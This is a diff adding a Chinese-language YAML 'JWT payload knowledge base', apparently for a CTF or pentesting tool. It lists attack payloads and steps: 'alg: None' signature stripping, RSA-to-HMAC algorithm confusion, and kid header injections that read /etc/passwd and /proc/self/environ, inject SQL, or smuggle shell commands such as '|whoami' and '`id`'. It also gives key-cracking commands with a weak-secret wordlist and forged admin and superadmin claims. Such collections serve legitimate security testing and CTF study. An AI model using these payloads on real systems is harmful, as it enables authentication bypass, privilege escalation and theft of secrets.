@@ -1,0 +1,159 @@
+# JWT Payload 知识库
+# 来源: Des-CTF-Knowledge + Hunter 实战经验
+# 更新: 2026-06-02
+
+metadata:
+  category: jwt
+  description: "JWT (JSON Web Token) 攻击 Payload 集合"
+  version: "1.0"
+
+# ============================================
+# 1. 算法攻击
+# ============================================
+algorithm_attacks:
+  description: "JWT 算法攻击"
+  none_algorithm:
+    description: "None 算法攻击，去掉签名"
+    header: '{"alg":"None","typ":"JWT"}'
+    payload: '{"user":"admin"}'
+    steps:
+      - "1. 解码 JWT"
+      - "2. 修改 header: alg 设为 None"
+      - "3. 修改 payload: 设置 admin 权限"
+      - "4. 去掉签名部分"
+      - "5. 重新编码（不签名）"
+  rsa_to_hmac:
+    description: "RSA→HMAC 算法混淆攻击"
+    header: '{"alg":"HS256","typ":"JWT"}'
+    steps:
+      - "1. 获取 RSA 公钥"
+      - "2. 将 RSA 公钥内容作为 HMAC 密钥"
+      - "3. 用 HS256 签名"
+    condition: "服务端用公钥验证 HS256 签名"
+
+# ============================================
+# 2. KID 注入
+# ============================================
+kid_injection:
+  description: "KID (Key ID) 注入攻击"
+  file_read:
+    - '{"alg":"HS256","typ":"JWT","kid":"/etc/passwd"}'
+    - '{"alg":"HS256","typ":"JWT","kid":"file:///etc/passwd"}'
+    - '{"alg":"HS256","typ":"JWT","kid":"/proc/self/environ"}'
+  sqli:
+    - "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key' union select 'secretkey' -- \"}"
+    - "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"key' or 1=1 -- \"}"
+  command_injection:
+    - '{"alg":"HS256","typ":"JWT","kid":"/path/to/key|whoami"}'
+    - '{"alg":"HS256","typ":"JWT","kid":"/path/to/key;id"}'
+    - '{"alg":"HS256","typ":"JWT","kid":"`id`"}'
+
+# ============================================
+# 3. 密钥爆破
+# ============================================
+key_cracking:
+  description: "JWT 密钥爆破"
+  tools:
+    - name: "jwt-cracker"
+      command: "./jwtcrack <token>"
+      description: "C语言实现，爆破弱密钥"
+    - name: "jwt_tool"
+      command: "python3 jwt_tool.py <token>"
+      description: "Python全功能工具"
+    - name: "hashcat"
+      command: "hashcat -m 16500 hash.txt wordlist.txt"
+      description: "GPU加速爆破"
+  common_keys:
+    - "secret"
+    - "password"
+    - "123456"
+    - "admin"
+    - "key"
+    - "jwt_secret"
+    - "your-256-bit-secret"
+    - "mysecret"
+    - "supersecret"
+
+# ============================================
+# 4. JWT 伪造
+# ============================================
+forgery:
+  description: "JWT 伪造 Payload"
+  admin_claim:
+    - '{"alg":"HS256","typ":"JWT"}'
+    - '{"sub":"admin","role":"admin","iat":1234567890,"exp":9999999999}'
+  user_enumeration:
+    - '{"alg":"HS256","typ":"JWT"}'
+    - '{"sub":"user1","role":"user","iat":1234567890,"exp":9999999999}'
+  privilege_escalation:
+    - '{"alg":"HS256","typ":"JWT"}'
+    - '{"sub":"test","role":"superadmin","permissions":["*"],"iat":1234567890,"exp":9999999999}'
+
+# ============================================
+# 5. JWT 工具
+# ============================================
+tools:
+  description: "JWT 攻击工具"
+  jwt_tool:
+    command: "python3 jwt_tool.py <token>"
+    options:
+      - "-C -d"  # 字典攻击
+      - "-X k"   # KID注入
+      - "-X a"   # 算法攻击
+      - "-S"     # 签名
+  jwt_cracker:
+    command: "jwtcrack <token>"
+    description: "C语言弱密钥爆破"
+  jwt_key_unconfuse:
+    command: "python3 jwt_key_unconfuse.py <token>"
+    description: "混淆密钥攻击"
+  john:
+    command: "john --wordlist=wordlist.txt --format=HMAC-SHA256 hash.txt"
+    description: "John the Ripper"
+
+# ============================================
+# 6. JWT 检测
+# ============================================
+detection:
+  description: "JWT 检测方法"
+  header_format:
+    - "eyJ"  # Base64 编码的 {"alg"
+  common_claims:
+    - "sub"
+    - "iss"
+    - "exp"
+    - "iat"
+    - "nbf"
+    - "jti"
+    - "aud"
+  vulnerabilities:
+    - "alg: None"
+    - "alg: HS256 (可能被RSA→HMAC攻击)"
+    - "kid: 可控"
+    - "exp: 未过期"
+    - "密钥弱"
+
+# ============================================
+# 7. JWT 绕过技巧
+# ============================================
+bypass:
+  description: "JWT 绕过技巧"
+  algorithm_confusion:
+    description: "算法混淆"
+    steps:
+      - "1. 获取公钥"
+      - "2. 修改 alg 为 HS256"
+      - "3. 用公钥作为密钥签名"
+  signature_stripped:
+    description: "签名去除"
+    steps:
+      - "1. 解码 JWT"
+      - "2. 修改 payload"
+      - "3. 去掉签名"
+      - "4. 修改 alg 为 None"
+  key_injection:
+    description: "密钥注入"
+    steps:
+      - "1. 在 kid 中注入路径"
+      - "2. 指向可控文件"
+      - "3. 用文件内容作为密钥"
